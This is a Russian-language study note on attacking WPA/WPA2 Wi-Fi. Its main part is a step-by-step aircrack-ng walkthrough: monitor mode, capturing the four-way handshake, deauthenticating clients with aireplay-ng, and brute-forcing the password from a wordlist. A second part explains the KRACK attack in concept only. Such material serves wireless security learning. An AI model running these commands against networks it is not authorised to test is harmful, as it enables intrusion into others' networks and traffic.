> ℹ️ Как ни странно, атаки на **WPA / WPA2** для понимания большинства намного проще, чем на тот же **WEP**. Возможно, все дело действительно в математике (ну или в количестве действий, необходимых для достижения результата).

Итак, а как же ломается алгоритм следующего поколения? Как ни странно, намного проще (с точки зрения исполнения) - достаточно всего лишь перехватить четырехэтапное рукопожатие.

И что, так просто? И да, и нет.

Сначала об атаках. Как мы знаем из [[Вводная теория#Аутентификация на основе четырехстороннего рукопожатия|введения]], ключ при четырехэтапном рукопожатии не передается полностью ни в одном из сообщений. Мало того, даже его части в явном виде не передаются по каналу связи. Тем не менее, от него зависят сессионные ключи (**PTK** и **GTK**), и имея их на руках, мы, чисто теоретически, можем попробовать получить из них пароль методом брутфорса.

Второй вариант - форсировать переустановку ключа (надеюсь, вы еще не забыли, что они временные?) на уже имевший место быть, что делает возможным расшифровать сообщения.

Но обо всем по порядку.

### Перехват четырехэтапного рукопожатия и восстановление пароля

Так как всю нужную теорию мы обсудили выше, вот краткий гайд, как это сделать:

`iwconfig` - получаем список интерфейсов.

`sudo systemctl stop NetworkManager` - остановка сервиса, который может помешать работе _aircrack-ng_.

`sudo airmon-ng check kill` - то же, что и выше.

`sudo ip link set wlan0 down` - останавливаем работу адаптера.

`sudo iw wlan0 set monitor control` - переводим адаптер в режим монитора.

`sudo ip link set wlan0 up` - снова включаем адаптер.

`iwconfig` - убеждаемся, что теперь в пункте _Mode_ стоит **Monitor**.

`airodump-ng wlan0` - получаем список BSSID точек, на которые мы можем провести атаку. Также благодаря этой команде можно понять, сколько устройств подключено к ней.

`iwconfig wlan0 channel <CH>` - настраиваемся на нужный канал (доступен в поле _CH_ результата команды выше).

`airodump-ng -с <CH> --bssid <BSSID> -w psk wlan0` - запускаем сбор трафика для того, чтобы поймать четырехэтапное рукопожатие.

далее в новом терминале с данными из предыдущего терминала:
`aireplay-ng -0 <своё кол-во пакетов (1-...)> -a <BSSID> -c <STATION> wlan0` - запускаем деатунтификацию пользователя `user` для ускорения процесса получения данных. В первом терминале должен появится `WPA handshake: ...`.

далее в первом терминале можно остановить предыдущий процесс и запустить новый:
`aircrack-ng -w passwords.list -b <BSSID> psk*.cap` - запускаем брутфорс пароля по полученным данным и идем ~~курить~~ пить чай. ( passwords.list - подготовленный заранее brootforse файл )

Стоит отметить, что данная атака очень сильно зависит от ~~параноидальности~~ осведомленности администратора сети. Если он выставил сложный или достаточно длинный пароль - взлом займет неадекватное количество времени, и сделать с этим, к сожалению, ничего нельзя.

### KRACK

_“Атака, которая позволит злоумышленнику прочитать ваш трафик как открытую книгу...”_ Страшно, да?

Как мы помним, на 3 этапе четырхэтапного рукопожатия клиент устанавливает сессионный ключ. Но что произойдет, если он, к примеру, не сможет его получить?

Ответ прост: так как каждый последующий этап зависит от предыдущего, 4 этап не будет пройден, и точка доступа направит ключ еще раз, и так до трех раз.

Как оказалось, злоумышленник вполне может вклиниться в эту цепочку, и форсировать изменение ключа на тот, который был использован ранее (и который известен злоумышленнику). При удачной эксплуатации злоумышленник получает возможность расшифровать весь трафик, идущий между точкой доступа и клиентом, и даже инжектировать или изменять пакеты, что, конечно, отчасти нивелируется тем, что большинство уровней **OSI** имеют свои дополнительные способы шифрования, но не убирает проблему полностью.

> ❕Других способов взломать **WPA / WPA2**, к сожалению, нет (не считая еще пары обходных методов, но об этом как-нибудь в другой раз).

***
### Полезные ссылки

[Документ с более техническим описанием атак на WEP и WPA](https://matthieu.io/dl/papers/wifi-attacks-wep-wpa.pdf)

[Официальная документация Aircrack-NG](https://www.aircrack-ng.org/doku.php?id=Main) - хорошая дока, без лишней воды.

[KRACK](https://www.krackattacks.com/) - whitepaper по одноименной атаке.